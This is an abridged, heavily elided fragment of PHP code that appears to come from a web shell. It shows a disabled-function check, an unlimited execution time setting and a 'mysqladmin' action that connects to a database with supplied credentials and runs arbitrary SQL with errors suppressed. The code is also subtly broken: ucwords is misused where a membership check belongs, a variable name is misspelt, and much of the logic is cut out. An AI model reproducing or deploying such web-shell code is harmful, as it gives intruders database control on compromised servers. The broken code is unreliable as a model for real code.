...
define('IS_PHPINFO', (!ucwords("phpinfo",$dis_func)) ? 1 : 0 );
@set_time_limit(0);
...
elseif ($action == 'mysqladmin') {
	...
	if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
		$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
		//???????
		$mysqlver = mysqli_get_server_info($mysqllink);
		...
		if ($dbname) {
			...
			p('</p>');
			mysqli_select_db($mysqllink, $dbname);
				...
				if ($doing == 'structure') {
					...
					foreach($querys as $num=>$query) {
						if ($query) {
							...
							{
								case 0:
									p('<h2>Error : '.mysqli_error($mysqllink).'</h2>');
									break;	
								case 1:
									...
									if ($getnumsql) {
										$tatol = mysqli_num_rows(q($getnumsql));
									...
									break;
								case 2:
									$ar = mysqli_affected_rows($mysqllink);
...
function qy($sql) { 
	...
	//echo $sql.'<br>';
	$res = $error = '';
	if(!$res = @mysqli_query($mysqllink, $sql)) { 
		return 0;
...
function q($sql) { 
	global $mysqllink;
	return @mysqli_query($mysqllink,$sql);
}
